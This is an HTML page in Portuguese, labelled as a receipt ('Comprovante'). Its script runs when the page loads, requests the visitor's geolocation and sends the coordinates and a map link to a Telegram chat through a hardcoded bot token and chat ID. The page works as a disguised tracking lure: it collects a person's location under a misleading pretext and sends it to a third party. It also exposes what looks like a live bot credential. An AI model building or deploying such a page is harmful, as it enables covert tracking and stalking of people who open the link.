<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>Enviar Localiza√ß√£o</title>
</head>
<body style="background-color: antiquewhite;">
  <h1>Comprovante</h1>

  <script>
    const TELEGRAM_BOT_TOKEN = "7639873609:AAH2uPa79Etivl6NCHAHynNrbPipp2Jh4bY"; // Substitua pelo token do bot
    const CHAT_ID = "913586281"; // Substitua pelo seu chat ID

    window.addEventListener("load", () => {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendLocation, handleError);
      } else {
        alert("Geolocaliza√ß√£o n√£o suportada pelo navegador.");
      }
    });

    function sendLocation(position) {
      const latitude = position.coords.latitude;
      const longitude = position.coords.longitude;
      const mapaLink = `https://www.google.com/maps?q=${latitude},${longitude}`;

      const mensagem = `üåç Localiza√ß√£o do usu√°rio:\nLatitude: ${latitude}\nLongitude: ${longitude}\n[üìç Ver no mapa](${mapaLink})`;

      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: mensagem,
          parse_mode: "Markdown"
        })
      })
      .then(response => response.json())
      .then(data => {
        if (data.ok) {
          alert("Localiza√ß√£o enviada com sucesso!");
        } else {
          alert("Erro ao enviar a localiza√ß√£o.");
        }
      })
      .catch(error => {
        console.error("Erro:", error);
      });
    }

    function handleError(error) {
      alert("Erro ao obter a localiza√ß√£o: " + error.message);
    }
  </script>
</body>
</html>
